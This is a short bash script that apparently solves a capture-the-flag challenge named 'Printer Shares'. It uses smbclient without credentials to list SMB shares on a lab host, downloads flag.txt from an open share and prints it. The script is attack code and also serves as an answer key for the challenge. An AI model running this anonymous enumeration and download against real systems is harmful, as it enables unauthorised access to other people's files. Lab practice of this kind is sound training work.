#!/usr/bin/env bash
# Automated solver for Challenge 759: Printer Shares
HOST="${1:-xebec.cylabacademy.net}"
PORT="${2:-41504}"

echo "[*] Querying public shares on $HOST:$PORT..."
smbclient -L "//$HOST" -p "$PORT" -N

echo "[*] Downloading flag from //shares..."
smbclient "//$HOST/shares" -p "$PORT" -N -c "get flag.txt"

echo "[+] Flag content:"
cat flag.txt
